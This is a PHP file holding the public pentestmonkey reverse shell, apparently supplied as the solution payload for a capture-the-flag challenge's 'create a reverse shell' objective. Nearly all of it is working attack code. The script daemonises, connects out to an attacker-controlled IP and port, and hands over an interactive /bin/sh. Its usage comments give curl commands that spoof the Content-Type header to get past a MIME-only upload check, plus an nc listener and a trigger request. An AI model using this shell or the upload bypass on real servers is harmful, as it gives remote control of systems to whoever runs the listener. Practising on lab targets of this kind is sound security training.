<?php
// php-reverse-shell.php -- the standard pentestmonkey reverse shell (public).
//
// This is the payload a player uploads through the FileVault admin panel to
// satisfy the Flag 3 objective ("create a reverse shell").
//
// USAGE
//   1. Edit $ip and $port below to point at YOUR listener.
//   2. Upload via the admin console (upload.php) with the Content-Type header
//      spoofed to image/jpeg so the MIME-only check passes, e.g.:
//        curl -b cookies.txt -H "Content-Type: image/jpeg" \
//          -F "file=@php-reverse-shell.php;type=image/jpeg" \
//          http://TARGET:8080/upload.php
//   3. Start a listener first:   nc -lvnp 4444
//   4. Trigger the shell:        curl http://TARGET:8080/uploads/php-reverse-shell.php

$ip = '10.10.14.2';   // <-- replace with YOUR tun0/VPN IP
$port = 4444;         // <-- replace with your listener port

set_time_limit(0);
error_reporting(0);

$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Cannot fork");
        exit(1);
    }
    if ($pid) { exit(0); }
    if (posix_setsid() == -1) {
        printit("Error: Cannot setsid()");
        exit(1);
    }
    $daemon = 1;
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { printit("$errstr ($errno)"); exit(1); }

$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); }

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; }
    if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit($string) {
    global $daemon;
    if (!$daemon) { print "$string\n"; }
}
?>
